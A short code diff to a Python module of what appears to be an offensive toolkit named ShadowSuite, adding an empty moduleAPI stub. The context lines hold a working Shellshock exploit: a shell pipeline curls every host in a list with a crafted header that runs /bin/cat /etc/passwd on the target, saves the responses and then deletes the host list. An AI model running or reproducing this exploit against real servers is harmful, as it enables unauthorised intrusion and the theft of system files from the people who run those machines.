@@ -125,3 +125,6 @@ def module_body(current_user, __MODULE_PATH__, __OUTPUT_PATH__, SESSION_ID, USER
     os.system("cat " + path_to_hosts + " | xargs -I % bash -c \'curl % -H \"custom:() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd\" && echo ----END OF RESPONSE----\' | tee " + output)
     os.system("rm " + path_to_hosts)
     print(API.ShadowSuite(current_user, __MODULE_PATH__, __OUTPUT_PATH__, SESSION_ID, USERLEVEL, debugging).FINISH)
+
+def moduleAPI(current_user, __MODULE_PATH__, __OUTPUT_PATH__, SESSION_ID, USERLEVEL, debugging):
+    pass
